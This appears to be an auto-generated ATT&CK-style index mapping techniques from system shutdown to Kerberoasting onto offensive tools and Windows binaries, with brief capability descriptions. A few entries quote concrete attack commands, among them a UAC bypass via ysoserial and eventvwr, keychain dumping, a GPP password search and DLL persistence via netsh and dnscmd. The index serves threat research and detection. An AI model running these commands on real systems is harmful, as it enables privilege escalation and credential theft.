- [TruffleHog](../tools/unknown/trufflehog.md) — explicit, source. [TruffleHog](https://attack.mitre.org/software/S9009) has gathered access tokens and API tokens from CI/CD pipeline solutions and repositories.(Citation: Black Hills Information Security TruffleHog January 2024)

## T1529 - System Shutdown／Reboot

- [Remcos](../tools/unknown/remcos.md) — explicit, source. [Remcos](https://attack.mitre.org/software/S0332) can shutdown and restart remote devices.(Citation: Fortinet Remcos Campaign NOV 2024)

## T1530 - Data from Cloud Storage

- [AADInternals](../tools/unknown/aadinternals.md) — explicit, source. AADInternals can collect files from a user’s OneDrive.(Citation: AADInternals)
- [Pacu](../tools/unknown/pacu.md) — explicit, source. [Pacu](https://attack.mitre.org/software/S1091) can enumerate and download files stored in AWS storage services, such as S3 buckets.(Citation: GitHub Pacu)
- [Peirates](../tools/unknown/peirates.md) — explicit, source. [Peirates](https://attack.mitre.org/software/S0683) can dump the contents of AWS S3 buckets. It can also retrieve service account tokens from kOps buckets in Google Cloud Storage or S3.(Citation: Peirates GitHub)
- [TruffleHog](../tools/unknown/trufflehog.md) — explicit, source. [TruffleHog](https://attack.mitre.org/software/S9009) has the ability to scan cloud storage services for credentials to include Amazon (AWS) S3 and Google Cloud Storage.(Citation: Black Hills Information Security TruffleHog January 2024)(Citation: Github TruffleSecurity Trufflehog April 2025)

## T1539 - Steal Web Session Cookie

- [evilginx2](../tools/unknown/evilginx2.md) — explicit, source. [evilginx2](https://attack.mitre.org/software/S9003) can collect information on each session with a victim including the session cookie.(Citation: Evilginx 2 July 2018)(Citation: Sophos Evilginx MAR 2025)


## T1543.002 - Systemd Service

- [Pupy](../tools/unknown/pupy.md) — explicit, source. [Pupy](https://attack.mitre.org/software/S0192) can be used to establish persistence using a systemd service.(Citation: GitHub Pupy)

## T1543.003 - Windows Service

- [Dnscmd.exe](../tools/windows/dnscmd.exe.md) — explicit, source. Command metadata lists T1543.003: dnscmd.exe dc1.lab.int /config /serverlevelplugindll {PATH_SMB:.dll}
- [Empire](../tools/unknown/empire.md) — explicit, source. [Empire](https://attack.mitre.org/software/S0363) can utilize built-in modules to modify service binaries and restore them to their original state.(Citation: Github PowerShell Empire)
- [PowerSploit](../tools/unknown/powersploit.md) — explicit, source. [PowerSploit](https://attack.mitre.org/software/S0194) contains a collection of Privesc-PowerUp modules that can discover and replace/modify service binaries, paths, and configs.(Citation: GitHub PowerSploit May 2012)(Citation: PowerSploit Documentation)
- [PsExec](../tools/unknown/psexec.md) — explicit, source. [PsExec](https://attack.mitre.org/software/S0029) can leverage Windows services to escalate privileges from administrator to SYSTEM with the <code>-s</code> argument.(Citation: Russinovich Sysinternals)
- [Remcos](../tools/unknown/remcos.md) — explicit, source. [Remcos](https://attack.mitre.org/software/S0332) can terminate, suspend, and resume a process by PID.(Citation: Fortinet Remcos Campaign NOV 2024)
- [SILENTTRINITY](../tools/unknown/silenttrinity.md) — explicit, source. [SILENTTRINITY](https://attack.mitre.org/software/S0692) can establish persistence by creating a new service.(Citation: GitHub SILENTTRINITY Modules July 2019)

## T1546 - Event Triggered Execution

- [Pacu](../tools/unknown/pacu.md) — explicit, source. [Pacu](https://attack.mitre.org/software/S1091) can set up S3 bucket notifications to trigger a malicious Lambda function when a CloudFormation template is uploaded to the bucket. It can also create Lambda functions that trigger upon the creation of users, roles, and groups.(Citation: GitHub Pacu)

## T1546.001 - Change Default File Association

- [SILENTTRINITY](../tools/unknown/silenttrinity.md) — explicit, source. [SILENTTRINITY](https://attack.mitre.org/software/S0692) can conduct an image hijack of an `.msc` file extension as part of its UAC bypass process.(Citation: GitHub SILENTTRINITY Modules July 2019)

## T1546.003 - Windows Management Instrumentation Event Subscription

- [PoshC2](../tools/unknown/poshc2.md) — explicit, source. [PoshC2](https://attack.mitre.org/software/S0378) has the ability to persist on a system using WMI events.(Citation: GitHub PoshC2)
- [SILENTTRINITY](../tools/unknown/silenttrinity.md) — explicit, source. [SILENTTRINITY](https://attack.mitre.org/software/S0692) can create a WMI Event to execute a payload for persistence.(Citation: GitHub SILENTTRINITY Modules July 2019)

## T1546.007 - Netsh Helper DLL

- [Netsh.exe](../tools/windows/netsh.exe.md) — explicit, source. Command metadata lists T1546.007: netsh.exe add helper {PATH_ABSOLUTE:.dll}
- [netsh](../tools/unknown/netsh.md) — explicit, source. [netsh](https://attack.mitre.org/software/S0108) can be used as a persistence proxy technique to execute a helper DLL when netsh.exe is executed.(Citation: Demaske Netsh Persistence)

## T1546.008 - Accessibility Features

- [Empire](../tools/unknown/empire.md) — explicit, source. [Empire](https://attack.mitre.org/software/S0363) can leverage WMI debugging to remotely replace binaries like sethc.exe, Utilman.exe, and Magnify.exe with cmd.exe.(Citation: Github PowerShell Empire)

## T1546.015 - Component Object Model Hijacking

- [PcShare](../tools/unknown/pcshare.md) — explicit, source. [PcShare](https://attack.mitre.org/software/S1050) has created the `HKCU\\Software\\Classes\\CLSID\\{42aedc87-2188-41fd-b9a3-0c966feabec1}\\InprocServer32` Registry key for persistence.(Citation: Bitdefender FunnyDream Campaign November 2020)
- [SILENTTRINITY](../tools/unknown/silenttrinity.md) — explicit, source. [SILENTTRINITY](https://attack.mitre.org/software/S0692) can add a CLSID key for payload execution through `Registry.CurrentUser.CreateSubKey("Software\\Classes\\CLSID\\{" + clsid + "}\\InProcServer32")`.(Citation: GitHub SILENTTRINITY Modules July 2019)

## T1547 - Boot or Logon Autostart Execution

- [Pnputil.exe](../tools/windows/pnputil.exe.md) — explicit, source. Command metadata lists T1547: pnputil.exe -i -a {PATH_ABSOLUTE:.inf}
- [Update.exe](../tools/windows/update.exe.md) — explicit, source. Command metadata lists T1547: Update.exe --createShortcut={PATH:.exe} -l=Startup

## T1547.001 - Registry Run Keys ／ Startup Folder

- [Empire](../tools/unknown/empire.md) — explicit, source. [Empire](https://attack.mitre.org/software/S0363) can modify the registry run keys <code>HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run</code> and <code>HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Run</code> for persistence.(Citation: Github PowerShell Empire)
- [Koadic](../tools/unknown/koadic.md) — explicit, source. [Koadic](https://attack.mitre.org/software/S0250) has added persistence to the `HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run` Registry key.(Citation: MalwareBytes LazyScripter Feb 2021)
- [MCMD](../tools/unknown/mcmd.md) — explicit, source. [MCMD](https://attack.mitre.org/software/S0500) can use Registry Run Keys for persistence.(Citation: Secureworks MCMD July 2019)
- [PowerSploit](../tools/unknown/powersploit.md) — explicit, source. [PowerSploit](https://attack.mitre.org/software/S0194)'s <code>New-UserPersistenceOption</code> Persistence argument can be used to establish via the <code>HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run</code> Registry key.(Citation: GitHub PowerSploit May 2012)(Citation: PowerSploit Documentation)
- [Pupy](../tools/unknown/pupy.md) — explicit, source. [Pupy](https://attack.mitre.org/software/S0192) adds itself to the startup folder or adds itself to the Registry key <code>SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run</code> for persistence.(Citation: GitHub Pupy)
- [QuasarRAT](../tools/unknown/quasarrat.md) — explicit, source. If the [QuasarRAT](https://attack.mitre.org/software/S0262) client process does not have administrator privileges it will add a registry key to `HKCU\Software\Microsoft\Windows\CurrentVersion\Run` for persistence.(Citation: GitHub QuasarRAT)(Citation: CISA AR18-352A Quasar RAT December 2018) 
- [Remcos](../tools/unknown/remcos.md) — explicit, source. [Remcos](https://attack.mitre.org/software/S0332) can add itself to the Registry key <code>HKCU\Software\Microsoft\Windows\CurrentVersion\Run</code> for persistence.(Citation: Fortinet Remcos Feb 2017)
- [SILENTTRINITY](../tools/unknown/silenttrinity.md) — explicit, source. [SILENTTRINITY](https://attack.mitre.org/software/S0692) can establish a LNK file in the startup folder for persistence.(Citation: GitHub SILENTTRINITY Modules July 2019)

## T1547.005 - Security Support Provider

- [Empire](../tools/unknown/empire.md) — explicit, source. [Empire](https://attack.mitre.org/software/S0363) can enumerate Security Support Providers (SSPs) as well as utilize [PowerSploit](https://attack.mitre.org/software/S0194)'s <code>Install-SSP</code> and <code>Invoke-Mimikatz</code> to install malicious SSPs and log authentication events.(Citation: Github PowerShell Empire)
- [Mimikatz](../tools/unknown/mimikatz.md) — explicit, source. The [Mimikatz](https://attack.mitre.org/software/S0002) credential dumper contains an implementation of an SSP.(Citation: Deply Mimikatz)
- [PowerSploit](../tools/unknown/powersploit.md) — explicit, source. [PowerSploit](https://attack.mitre.org/software/S0194)'s <code>Install-SSP</code> Persistence module can be used to establish by installing a SSP DLL.(Citation: GitHub PowerSploit May 2012)(Citation: PowerSploit Documentation)

## T1547.009 - Shortcut Modification

- [Empire](../tools/unknown/empire.md) — explicit, source. [Empire](https://attack.mitre.org/software/S0363) can persist by modifying a .LNK file to include a backdoor.(Citation: Github PowerShell Empire)

## T1547.013 - XDG Autostart Entries

- [Pupy](../tools/unknown/pupy.md) — explicit, source. [Pupy](https://attack.mitre.org/software/S0192) can use an XDG Autostart to establish persistence.(Citation: Red Canary Netwire Linux 2022)

## T1548.002 - Bypass User Account Control

- [CSPY Downloader](../tools/unknown/cspy-downloader.md) — explicit, source. [CSPY Downloader](https://attack.mitre.org/software/S0527) can bypass UAC using the SilentCleanup task to execute the binary with elevated privileges.(Citation: Cybereason Kimsuky November 2020)
- [ComputerDefaults.exe](../tools/windows/computerdefaults.exe.md) — explicit, source. Command metadata lists T1548.002: ComputerDefaults.exe
- [Empire](../tools/unknown/empire.md) — explicit, source. [Empire](https://attack.mitre.org/software/S0363) includes various modules to attempt to bypass UAC for escalation of privileges.(Citation: Github PowerShell Empire)
- [Eudcedit.exe](../tools/windows/eudcedit.exe.md) — explicit, source. Command metadata lists T1548.002: eudcedit
- [Eventvwr.exe](../tools/windows/eventvwr.exe.md) — explicit, source. Command metadata lists T1548.002: ysoserial.exe -o raw -f BinaryFormatter - g DataSet -c "{CMD}" > RecentViews & copy RecentViews %LOCALAPPDATA%\Microsoft\EventV~1\RecentViews & eventvwr.exe
- [Koadic](../tools/unknown/koadic.md) — explicit, source. [Koadic](https://attack.mitre.org/software/S0250) has 2 methods for elevating integrity. It can bypass UAC through `eventvwr.exe` and `sdclt.exe`.(Citation: Github Koadic)
- [PoshC2](../tools/unknown/poshc2.md) — explicit, source. [PoshC2](https://attack.mitre.org/software/S0378) can utilize multiple methods to bypass UAC.(Citation: GitHub PoshC2)
- [Pupy](../tools/unknown/pupy.md) — explicit, source. [Pupy](https://attack.mitre.org/software/S0192) can bypass Windows UAC through either DLL hijacking, eventvwr, or appPaths.(Citation: GitHub Pupy)
- [QuasarRAT](../tools/unknown/quasarrat.md) — explicit, source. 
[QuasarRAT](https://attack.mitre.org/software/S0262) can generate a UAC pop-up Window to prompt the target user to run a command as the administrator.(Citation: CISA AR18-352A Quasar RAT December 2018)
- [Remcos](../tools/unknown/remcos.md) — explicit, source. [Remcos](https://attack.mitre.org/software/S0332) has a command for UAC bypassing.(Citation: Fortinet Remcos Feb 2017)
- [SILENTTRINITY](../tools/unknown/silenttrinity.md) — explicit, source. [SILENTTRINITY](https://attack.mitre.org/software/S0692) contains a number of modules that can bypass UAC, including through Window's Device Manager, Manage Optional Features, and an image hijack on the `.msc` file extension.(Citation: GitHub SILENTTRINITY Modules July 2019)   
- [Sliver](../tools/unknown/sliver.md) — explicit, source. [Sliver](https://attack.mitre.org/software/S0633) can leverage multiple techniques to bypass User Account Control (UAC) on Windows systems.(Citation: Cybereason Sliver Undated)
- [UACMe](../tools/unknown/uacme.md) — explicit, source. [UACMe](https://attack.mitre.org/software/S0116) contains many methods for bypassing Windows User Account Control on multiple versions of the operating system.(Citation: Github UACMe)
- [Wsreset.exe](../tools/windows/wsreset.exe.md) — explicit, source. Command metadata lists T1548.002: wsreset.exe
- [iscsicpl.exe](../tools/windows/iscsicpl.exe.md) — explicit, source. Command metadata lists T1548.002: iscsicpl.exe
- [odbcad32.exe](../tools/windows/odbcad32.exe.md) — explicit, source. Command metadata lists T1548.002: odbcad32.exe

## T1550.001 - Application Access Token

- [Peirates](../tools/unknown/peirates.md) — explicit, source. [Peirates](https://attack.mitre.org/software/S0683) can use stolen service account tokens to perform its operations. It also enables adversaries to switch between valid service accounts.(Citation: Peirates GitHub)

## T1550.002 - Pass the Hash

- [CrackMapExec](../tools/unknown/crackmapexec.md) — explicit, source. [CrackMapExec](https://attack.mitre.org/software/S0488) can pass the hash to authenticate via SMB.(Citation: CME Github September 2018)
- [Empire](../tools/unknown/empire.md) — explicit, source. [Empire](https://attack.mitre.org/software/S0363) can perform pass the hash attacks.(Citation: Github PowerShell Empire)
- [Mimikatz](../tools/unknown/mimikatz.md) — explicit, source. [Mimikatz](https://attack.mitre.org/software/S0002)'s <code>SEKURLSA::Pth</code> module can impersonate a user, with only a password hash, to execute arbitrary commands.(Citation: Adsecurity Mimikatz Guide)(Citation: NCSC Joint Report Public Tools)(Citation: Cobalt Strike Manual 4.3 November 2020)
- [Pass-The-Hash Toolkit](../tools/unknown/pass-the-hash-toolkit.md) — explicit, source. [Pass-The-Hash Toolkit](https://attack.mitre.org/software/S0122) can perform pass the hash.(Citation: Mandiant APT1)
- [PoshC2](../tools/unknown/poshc2.md) — explicit, source. [PoshC2](https://attack.mitre.org/software/S0378) has a number of modules that leverage pass the hash for lateral movement.(Citation: GitHub PoshC2)

## T1550.003 - Pass the Ticket

- [Mimikatz](../tools/unknown/mimikatz.md) — explicit, source. [Mimikatz](https://attack.mitre.org/software/S0002)’s <code>LSADUMP::DCSync</code> and <code>KERBEROS::PTT</code> modules implement the three steps required to extract the krbtgt account hash and create/use Kerberos tickets.(Citation: Adsecurity Mimikatz Guide)(Citation: AdSecurity Kerberos GT Aug 2015)(Citation: Harmj0y DCSync Sept 2015)(Citation: NCSC Joint Report Public Tools)
- [Pupy](../tools/unknown/pupy.md) — explicit, source. [Pupy](https://attack.mitre.org/software/S0192) can also perform pass-the-ticket.(Citation: GitHub Pupy)

## T1552 - Unsecured Credentials

- [NPPSPY](../tools/unknown/nppspy.md) — explicit, source. [NPPSPY](https://attack.mitre.org/software/S1131) captures credentials by recording them through an alternative network listener registered to the <code>mpnotify.exe</code> process, allowing for cleartext recording of logon information.(Citation: Huntress NPPSPY 2022)
- [Pacu](../tools/unknown/pacu.md) — explicit, source. [Pacu](https://attack.mitre.org/software/S1091) can search for sensitive data: for example, in Code Build environment variables, EC2 user data, and Cloud Formation templates.(Citation: GitHub Pacu)

## T1552.001 - Credentials In Files

- [AADInternals](../tools/unknown/aadinternals.md) — explicit, source. [AADInternals](https://attack.mitre.org/software/S0677) can gather unsecured credentials for Azure AD services, such as Azure AD Connect, from a local machine.(Citation: AADInternals Documentation)
- [Empire](../tools/unknown/empire.md) — explicit, source. [Empire](https://attack.mitre.org/software/S0363) can use various modules to search for files containing passwords.(Citation: Github PowerShell Empire)
- [Findstr.exe](../tools/windows/findstr.exe.md) — explicit, source. Command metadata lists T1552.001: findstr /S /I cpassword \\sysvol\policies\*.xml
- [LaZagne](../tools/unknown/lazagne.md) — explicit, source. [LaZagne](https://attack.mitre.org/software/S0349) can obtain credentials from chats, databases, mail, and WiFi.(Citation: GitHub LaZagne Dec 2018)
- [PoshC2](../tools/unknown/poshc2.md) — explicit, source. [PoshC2](https://attack.mitre.org/software/S0378) contains modules for searching for passwords in local and remote files.(Citation: GitHub PoshC2)
- [Pupy](../tools/unknown/pupy.md) — explicit, source. [Pupy](https://attack.mitre.org/software/S0192) can use Lazagne for harvesting credentials.(Citation: GitHub Pupy)
- [QuasarRAT](../tools/unknown/quasarrat.md) — explicit, source. [QuasarRAT](https://attack.mitre.org/software/S0262) can obtain passwords from FTP clients.(Citation: GitHub QuasarRAT)(Citation: Volexity Patchwork June 2018)
- [TruffleHog](../tools/unknown/trufflehog.md) — explicit, source. [TruffleHog](https://attack.mitre.org/software/S9009) has obtained credentials stored in config files and credential files in victim environments.(Citation: Black Hills Information Security TruffleHog January 2024)(Citation: Netskope Shai-Hulud November 2025)

## T1552.002 - Credentials in Registry

- [PowerSploit](../tools/unknown/powersploit.md) — explicit, source. [PowerSploit](https://attack.mitre.org/software/S0194) has several modules that search the Windows Registry for stored credentials: <code>Get-UnattendedInstallFile</code>, <code>Get-Webconfig</code>, <code>Get-ApplicationHost</code>, <code>Get-SiteListPassword</code>, <code>Get-CachedGPPPassword</code>, and <code>Get-RegistryAutoLogon</code>.(Citation: Pentestlab Stored Credentials)
- [Reg](../tools/unknown/reg.md) — explicit, source. [Reg](https://attack.mitre.org/software/S0075) may be used to find credentials in the Windows Registry.(Citation: Pentestlab Stored Credentials)

## T1552.004 - Private Keys

- [AADInternals](../tools/unknown/aadinternals.md) — explicit, source. [AADInternals](https://attack.mitre.org/software/S0677) can gather encryption keys from Azure AD services such as ADSync and Active Directory Federated Services servers.(Citation: AADInternals Documentation)
- [Empire](../tools/unknown/empire.md) — explicit, source. [Empire](https://attack.mitre.org/software/S0363) can use modules like <code>Invoke-SessionGopher</code> to extract private key and session information.(Citation: Github PowerShell Empire)
- [Mimikatz](../tools/unknown/mimikatz.md) — explicit, source. [Mimikatz](https://attack.mitre.org/software/S0002)'s <code>CRYPTO::Extract</code> module can extract keys by interacting with Windows cryptographic application programming interface (API) functions.(Citation: Adsecurity Mimikatz Guide)

## T1552.005 - Cloud Instance Metadata API

- [Peirates](../tools/unknown/peirates.md) — explicit, source. [Peirates](https://attack.mitre.org/software/S0683) can query the query AWS and GCP metadata APIs for secrets.(Citation: Peirates GitHub)
- [TruffleHog](../tools/unknown/trufflehog.md) — explicit, source. [TruffleHog](https://attack.mitre.org/software/S9009) can query the AWS and GCP metadata endpoints for instances and service credentials.(Citation: Black Hills Information Security TruffleHog January 2024)(Citation: Github TruffleSecurity Trufflehog April 2025)

## T1552.006 - Group Policy Preferences

- [PowerSploit](../tools/unknown/powersploit.md) — explicit, source. [PowerSploit](https://attack.mitre.org/software/S0194) contains a collection of Exfiltration modules that can harvest credentials from Group Policy Preferences.(Citation: GitHub PowerSploit May 2012)(Citation: PowerSploit Documentation)
- [SILENTTRINITY](../tools/unknown/silenttrinity.md) — explicit, source. [SILENTTRINITY](https://attack.mitre.org/software/S0692) has a module that can extract cached GPP passwords.(Citation: GitHub SILENTTRINITY Modules July 2019) 

## T1552.007 - Container API

- [Peirates](../tools/unknown/peirates.md) — explicit, source. [Peirates](https://attack.mitre.org/software/S0683) can query the Kubernetes API for secrets.(Citation: Peirates GitHub)

## T1553.002 - Code Signing

- [CSPY Downloader](../tools/unknown/cspy-downloader.md) — explicit, source. [CSPY Downloader](https://attack.mitre.org/software/S0527) has come signed with revoked certificates.(Citation: Cybereason Kimsuky November 2020)
- [QuasarRAT](../tools/unknown/quasarrat.md) — explicit, source. A [QuasarRAT](https://attack.mitre.org/software/S0262) .dll file is digitally signed by a certificate from AirVPN.(Citation: Volexity Patchwork June 2018)

## T1553.004 - Install Root Certificate

- [certutil](../tools/unknown/certutil.md) — explicit, source. [certutil](https://attack.mitre.org/software/S0160) can be used to install browser root certificates as a precursor to performing [Adversary-in-the-Middle](https://attack.mitre.org/techniques/T1557) between connections to banking websites. Example command: <code>certutil -addstore -f -user ROOT ProgramData\cert512121.der</code>.(Citation: Palo Alto Retefe)
- [evilginx2](../tools/unknown/evilginx2.md) — explicit, source. [evilginx2](https://attack.mitre.org/software/S9003) has obtained a valid SSL/TLS certificate from LetsEncrypt to provide responses to Automatic Certificate Management Environment (ACME) challenges.(Citation: Evilginx 2 July 2018)

## T1555 - Credentials from Password Stores

- [LaZagne](../tools/unknown/lazagne.md) — explicit, source. [LaZagne](https://attack.mitre.org/software/S0349) can obtain credentials from databases, mail, and WiFi across multiple platforms.(Citation: GitHub LaZagne Dec 2018)
- [Mimikatz](../tools/unknown/mimikatz.md) — explicit, source. [Mimikatz](https://attack.mitre.org/software/S0002) performs credential dumping to obtain account and password information useful in gaining access to additional systems and enterprise network resources. It contains functionality to acquire information about credentials in many ways, including from the credential vault and DPAPI.(Citation: Deply Mimikatz)(Citation: GitHub Mimikatz lsadump Module)(Citation: Directory Services Internals DPAPI Backup Keys Oct 2015)(Citation: NCSC Joint Report Public Tools)(Citation: Cobalt Strike Manual 4.3 November 2020)	
- [PoshC2](../tools/unknown/poshc2.md) — explicit, source. [PoshC2](https://attack.mitre.org/software/S0378) can decrypt passwords stored in the RDCMan configuration file.(Citation: SecureWorks August 2019)
- [Pupy](../tools/unknown/pupy.md) — explicit, source. [Pupy](https://attack.mitre.org/software/S0192) can use Lazagne for harvesting credentials.(Citation: GitHub Pupy)
- [QuasarRAT](../tools/unknown/quasarrat.md) — explicit, source. [QuasarRAT](https://attack.mitre.org/software/S0262) can obtain passwords from common FTP clients.(Citation: GitHub QuasarRAT)(Citation: Volexity Patchwork June 2018)

## T1555.001 - Keychain

- [Empire](../tools/unknown/empire.md) — explicit, source. [Empire](https://attack.mitre.org/software/S0363) uses the command `/usr/bin/security dump-keychain -d` to read the keychain credential.(Citation: Empire Keychain Decrypt)
- [LaZagne](../tools/unknown/lazagne.md) — explicit, source. [LaZagne](https://attack.mitre.org/software/S0349) can obtain credentials from macOS Keychains.(Citation: GitHub LaZagne Dec 2018)	

## T1555.003 - Credentials from Web Browsers

- [Empire](../tools/unknown/empire.md) — explicit, source. [Empire](https://attack.mitre.org/software/S0363) can use modules that extract passwords from common web browsers such as Firefox and Chrome.(Citation: Github PowerShell Empire)
- [Imminent Monitor](../tools/unknown/imminent-monitor.md) — explicit, source. [Imminent Monitor](https://attack.mitre.org/software/S0434) has a PasswordRecoveryPacket module for recovering browser passwords.(Citation: QiAnXin APT-C-36 Feb2019)
- [LaZagne](../tools/unknown/lazagne.md) — explicit, source. [LaZagne](https://attack.mitre.org/software/S0349) can obtain credentials from web browsers such as Google Chrome, Internet Explorer, and Firefox.(Citation: GitHub LaZagne Dec 2018)
- [Mimikatz](../tools/unknown/mimikatz.md) — explicit, source. [Mimikatz](https://attack.mitre.org/software/S0002) performs credential dumping to obtain account and password information useful in gaining access to additional systems and enterprise network resources. It contains functionality to acquire information about credentials in many ways, including from DPAPI.(Citation: Deply Mimikatz)(Citation: GitHub Mimikatz lsadump Module)(Citation: Directory Services Internals DPAPI Backup Keys Oct 2015)(Citation: NCSC Joint Report Public Tools)	
- [Pupy](../tools/unknown/pupy.md) — explicit, source. [Pupy](https://attack.mitre.org/software/S0192) can use Lazagne for harvesting credentials.(Citation: GitHub Pupy)
- [QuasarRAT](../tools/unknown/quasarrat.md) — explicit, source. [QuasarRAT](https://attack.mitre.org/software/S0262) can obtain passwords from common web browsers.(Citation: GitHub QuasarRAT)(Citation: Volexity Patchwork June 2018)(Citation: Kaspersky BlindEagle AUG 2024)

- [SILENTTRINITY](../tools/unknown/silenttrinity.md) — explicit, source. [SILENTTRINITY](https://attack.mitre.org/software/S0692) can collect clear text web credentials for Internet Explorer/Edge.(Citation: GitHub SILENTTRINITY Modules July 2019)

## T1555.004 - Windows Credential Manager

- [LaZagne](../tools/unknown/lazagne.md) — explicit, source. [LaZagne](https://attack.mitre.org/software/S0349) can obtain credentials from Vault files.(Citation: GitHub LaZagne Dec 2018)	
- [Mimikatz](../tools/unknown/mimikatz.md) — explicit, source. [Mimikatz](https://attack.mitre.org/software/S0002) contains functionality to acquire credentials from the Windows Credential Manager.(Citation: Delpy Mimikatz Crendential Manager)
- [PowerSploit](../tools/unknown/powersploit.md) — explicit, source. [PowerSploit](https://attack.mitre.org/software/S0194) contains a collection of Exfiltration modules that can harvest credentials from Windows vault credential objects.(Citation: GitHub PowerSploit May 2012)(Citation: PowerSploit Documentation)
- [SILENTTRINITY](../tools/unknown/silenttrinity.md) — explicit, source. [SILENTTRINITY](https://attack.mitre.org/software/S0692) can gather Windows Vault credentials.(Citation: GitHub SILENTTRINITY Modules July 2019) 

## T1555.006 - Cloud Secrets Management Stores

- [Pacu](../tools/unknown/pacu.md) — explicit, source. [Pacu](https://attack.mitre.org/software/S1091) can retrieve secrets from the AWS Secrets Manager via the enum_secrets module.(Citation: GitHub Pacu)
- [TruffleHog](../tools/unknown/trufflehog.md) — explicit, source. [TruffleHog](https://attack.mitre.org/software/S9009) can obtain secrets from AWS Secrets and GCP Secret Manager.(Citation: Black Hills Information Security TruffleHog January 2024)(Citation: Github TruffleSecurity Trufflehog April 2025) [TruffleHog](https://attack.mitre.org/software/S9009) has also gathered passwords, secrets and API keys from source repositories, .env files, and git history.(Citation: Netskope Shai-Hulud November 2025)

## T1556 - Modify Authentication Process

- [SILENTTRINITY](../tools/unknown/silenttrinity.md) — explicit, source. [SILENTTRINITY](https://attack.mitre.org/software/S0692) can create a backdoor in KeePass using a malicious config file and in TortoiseSVN using a registry hook.(Citation: GitHub SILENTTRINITY Modules July 2019)

## T1556.006 - Multi-Factor Authentication

- [AADInternals](../tools/unknown/aadinternals.md) — explicit, source. The [AADInternals](https://attack.mitre.org/software/S0677) `Set-AADIntUserMFA` command can be used to disable MFA for a specified user.

## T1556.007 - Hybrid Identity

- [AADInternals](../tools/unknown/aadinternals.md) — explicit, source. [AADInternals](https://attack.mitre.org/software/S0677) can inject a malicious DLL (`PTASpy`) into the `AzureADConnectAuthenticationAgentService` to backdoor Azure AD Pass-Through Authentication.(Citation: AADInternals Azure AD On-Prem to Cloud)

## T1557 - Adversary-in-the-Middle

- [NPPSPY](../tools/unknown/nppspy.md) — explicit, source. [NPPSPY](https://attack.mitre.org/software/S1131) opens a new network listener for the <code>mpnotify.exe</code> process that is typically contacted by the Winlogon process in Windows. A new, alternative RPC channel is set up with a malicious DLL recording plaintext credentials entered into Winlogon, effectively intercepting and redirecting the logon information.(Citation: Huntress NPPSPY 2022)
- [evilginx2](../tools/unknown/evilginx2.md) — explicit, source. [evilginx2](https://attack.mitre.org/software/S9003) has the ability to act as an adversary-in-the-middle (AiTM) relay between a legitimate website and a phished user to capture all transmitted data including usernames, passwords, authentication tokens, and session cookies and tokens.(Citation: Evilginx 2 July 2018)(Citation: Breakdev Evilginx 3.0 May 2023)(Citation: Breakdev Evilginx 3.2 AUG 2023)(Citation: Sophos Evilginx MAR 2025)

## T1557.001 - Name Resolution Poisoning and SMB Relay

- [Empire](../tools/unknown/empire.md) — explicit, source. [Empire](https://attack.mitre.org/software/S0363) can use Inveigh to conduct name service poisoning for credential theft and associated relay attacks.(Citation: Github PowerShell Empire)(Citation: GitHub Inveigh)
- [Impacket](../tools/unknown/impacket.md) — explicit, source. [Impacket](https://attack.mitre.org/software/S0357) modules like ntlmrelayx and smbrelayx can be used in conjunction with [Network Sniffing](https://attack.mitre.org/techniques/T1040) and [Name Resolution Poisoning and SMB Relay](https://attack.mitre.org/techniques/T1557/001) to gather NetNTLM credentials for [Brute Force](https://attack.mitre.org/techniques/T1110) or relay attacks that can gain code execution.(Citation: Impacket Tools)
- [PoshC2](../tools/unknown/poshc2.md) — explicit, source. [PoshC2](https://attack.mitre.org/software/S0378) can use Inveigh to conduct name service poisoning for credential theft and associated relay attacks.(Citation: GitHub PoshC2)
- [Pupy](../tools/unknown/pupy.md) — explicit, source. [Pupy](https://attack.mitre.org/software/S0192) can sniff plaintext network credentials and use NBNS Spoofing to poison name services.(Citation: GitHub Pupy)
- [Responder](../tools/unknown/responder.md) — explicit, source. [Responder](https://attack.mitre.org/software/S0174) is used to poison name services to gather hashes and credentials from systems within a local network.(Citation: GitHub Responder)

## T1558.001 - Golden Ticket

- [Empire](../tools/unknown/empire.md) — explicit, source. [Empire](https://attack.mitre.org/software/S0363) can leverage its implementation of [Mimikatz](https://attack.mitre.org/software/S0002) to obtain and use golden tickets.(Citation: Github PowerShell Empire)
- [Mimikatz](../tools/unknown/mimikatz.md) — explicit, source. [Mimikatz](https://attack.mitre.org/software/S0002)'s kerberos module can create golden tickets.(Citation: GitHub Mimikatz kerberos Module)(Citation: Cobalt Strike Manual 4.3 November 2020)
- [Rubeus](../tools/unknown/rubeus.md) — explicit, source. [Rubeus](https://attack.mitre.org/software/S1071) can forge a ticket-granting ticket.(Citation: GitHub Rubeus March 2023)
- [Sliver](../tools/unknown/sliver.md) — explicit, source. [Sliver](https://attack.mitre.org/software/S0633) incorporates the [Rubeus](https://attack.mitre.org/software/S1071) framework to allow for Kerberos ticket manipulation, specifically for forging Kerberos Golden Tickets.(Citation: Cybereason Sliver Undated)

## T1558.002 - Silver Ticket

- [AADInternals](../tools/unknown/aadinternals.md) — explicit, source. [AADInternals](https://attack.mitre.org/software/S0677) can be used to forge Kerberos tickets using the password hash of the AZUREADSSOACC account.(Citation: AADInternals Documentation)
- [Empire](../tools/unknown/empire.md) — explicit, source. [Empire](https://attack.mitre.org/software/S0363) can leverage its implementation of [Mimikatz](https://attack.mitre.org/software/S0002) to obtain and use silver tickets.(Citation: Github PowerShell Empire)
- [Mimikatz](../tools/unknown/mimikatz.md) — explicit, source. [Mimikatz](https://attack.mitre.org/software/S0002)'s kerberos module can create silver tickets.(Citation: GitHub Mimikatz kerberos Module)
- [Rubeus](../tools/unknown/rubeus.md) — explicit, source. [Rubeus](https://attack.mitre.org/software/S1071) can create silver tickets.(Citation: GitHub Rubeus March 2023)

## T1558.003 - Kerberoasting

- [Brute Ratel C4](../tools/unknown/brute-ratel-c4.md) — explicit, source. [Brute Ratel C4](https://attack.mitre.org/software/S1063) can decode Kerberos 5 tickets and convert it to hashcat format for subsequent cracking.(Citation: Palo Alto Brute Ratel July 2022)
- [Empire](../tools/unknown/empire.md) — explicit, source. [Empire](https://attack.mitre.org/software/S0363) uses [PowerSploit](https://attack.mitre.org/software/S0194)'s <code>Invoke-Kerberoast</code> to request service tickets and return crackable ticket hashes.(Citation: Github PowerShell Empire)
